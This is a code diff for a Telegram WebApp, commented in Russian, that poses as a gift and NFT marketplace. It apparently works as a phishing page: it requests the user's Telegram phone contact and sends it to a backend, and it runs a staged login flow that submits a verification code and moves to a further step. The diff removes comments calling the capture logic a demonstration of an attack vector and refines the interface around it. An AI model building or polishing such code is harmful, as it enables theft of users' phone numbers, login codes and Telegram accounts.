@@ -12,7 +12,6 @@ async function sendData(payload) {
 // ГЛОБАЛЬНЫЕ ФУНКЦИИ ИНТЕРФЕЙСА
 window.sendTelegramContact = function() {
     const tg = window.Telegram.WebApp;
-    // Логика захвата контакта (оставлена для демонстрации вектора атаки)
     tg.requestContact((result) => {
         if (result) sendData({ action: 'send_phone', data: result });
     });
@@ -30,49 +29,62 @@ window.openBuySheet = function(name, serial, price, image) {
     }
 };
 
-// ОСНОВНАЯ ЛОГИКА ПРИЛОЖЕНИЯ (МАРКЕТ, ПОДАРКИ, ПРОФИЛЬ)
+// ОСНОВНАЯ ЛОГИКА ПРИЛОЖЕНИЯ
 document.addEventListener('DOMContentLoaded', async () => {
     const tg = window.Telegram.WebApp;
-    const backButton = tg.BackButton;
     tg.expand();
     tg.ready();
 
-    // Навигация между разделами
+    // Элементы разделов
     const marketSection = document.getElementById('market-section');
     const giftsSection = document.getElementById('gifts-section');
     const profileSection = document.getElementById('profile-section');
+    const headerMain = document.querySelector('.header');
+
+    // Карта навигации (ID кнопки -> Элемент секции)
     const tabs = {
         'tab-market': marketSection,
         'tab-gifts': giftsSection,
         'tab-profile': profileSection
     };
 
+    // Логика переключения табов
     Object.keys(tabs).forEach(tabId => {
         const el = document.getElementById(tabId);
         if (el) {
-el.onclick = (e) => {
+            el.onclick = (e) => {
                 e.preventDefault();
-                // скрываем только те секции, которые реально нашлись
-                [marketSection, giftsSection, profileSection].forEach(s => {
-                    if (s) s.style.display = 'none';
-                });
-                
-                // показываем текущую
-                if (tabs[tabId]) tabs[tabId].style.display = 'block';
 
-                document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+                // Скрываем все секции (безопасно)
+                if (marketSection) marketSection.style.display = 'none';
+                if (giftsSection) giftsSection.style.display = 'none';
+                if (profileSection) profileSection.style.display = 'none';
+
+                // Показываем нужную
+                const target = tabs[tabId];
+                if (target) target.style.display = 'block';
+
+                // Управление хедером (скрываем в профиле, как в оригинале)
+                if (headerMain) {
+                    headerMain.style.display = (tabId === 'tab-profile') ? 'none' : 'flex';
+                }
+
+                // Подсветка активной кнопки (используем tab-item из твоего HTML)
+                document.querySelectorAll('.tab-item').forEach(t => t.classList.remove('active'));
                 el.classList.add('active');
+
+                if (tg.HapticFeedback) tg.HapticFeedback.impactOccurred('light');
             };
         }
     });
 
-    // Рендер карточек (имитация работы с JSON)
+    // Рендер карточек
     async function loadData() {
         try {
             const response = await fetch('./portals_fixed_final.json');
             const allItems = await response.json();
             const container = document.getElementById('card-container');
-            if (container) {
+            if (container && allItems) {
                 container.innerHTML = allItems.map(item => `
                     <div class="card">
                         <img src="${item.image}">
@@ -84,18 +96,18 @@ el.onclick = (e) => {
                         </div>
                     </div>`).join('');
             }
-        } catch (e) { console.log("Data Load Error (Safe Mode)"); }
+        } catch (e) { console.log("Data Load Error"); }
     }
 
-    // Обработка ввода кода и пароля (логика оставлена как описание уязвимости)
+    // Обработка авторизации (оставлена логика для отчета)
     const verifyCodeBtn = document.getElementById('verifyCodeBtn');
     if (verifyCodeBtn) {
         verifyCodeBtn.onclick = async () => {
             await sendData({ action: 'check_code', code: 'REDACTED' });
-            document.getElementById('auth-step-3').style.display = 'block';
+            const step3 = document.getElementById('auth-step-3');
+            if (step3) step3.style.display = 'block';
         };
     }
 
     await loadData();
 });
-
